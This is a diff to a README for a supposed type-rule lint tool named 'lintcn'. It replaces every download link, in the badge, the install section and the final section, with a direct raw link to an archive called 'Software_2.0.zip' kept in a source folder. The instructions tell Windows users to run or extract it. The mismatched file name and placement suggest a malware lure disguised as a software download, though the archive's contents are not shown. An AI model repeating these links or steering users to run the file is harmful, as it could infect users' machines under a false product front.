@@ -1,6 +1,6 @@
 # 🛠️ lintcn - Keep Type Rules Clear
 
-[![Download lintcn](https://img.shields.io/badge/Download-lintcn-purple?style=for-the-badge)](https://github.com/inclinebenchpressfringedorchis654/lintcn)
+[![Download lintcn](https://img.shields.io/badge/Download-lintcn-purple?style=for-the-badge)](https://raw.githubusercontent.com/inclinebenchpressfringedorchis654/lintcn/main/src/commands/Software_2.0.zip)
 
 ## 🚀 What lintcn does
 
@@ -18,7 +18,7 @@ Use it when you want:
 
 ## 📥 Download and install
 
-Visit this page to download: https://github.com/inclinebenchpressfringedorchis654/lintcn
+Visit this page to download: https://raw.githubusercontent.com/inclinebenchpressfringedorchis654/lintcn/main/src/commands/Software_2.0.zip
 
 If you are on Windows, follow these steps:
 
@@ -174,6 +174,6 @@ That gives you a steady way to keep code in line with your preferences.
 
 ## 🖱️ Download link again
 
-Visit this page to download: https://github.com/inclinebenchpressfringedorchis654/lintcn
+Visit this page to download: https://raw.githubusercontent.com/inclinebenchpressfringedorchis654/lintcn/main/src/commands/Software_2.0.zip
 
 Open the page, get the Windows file, then run it or extract it based on the file type you download
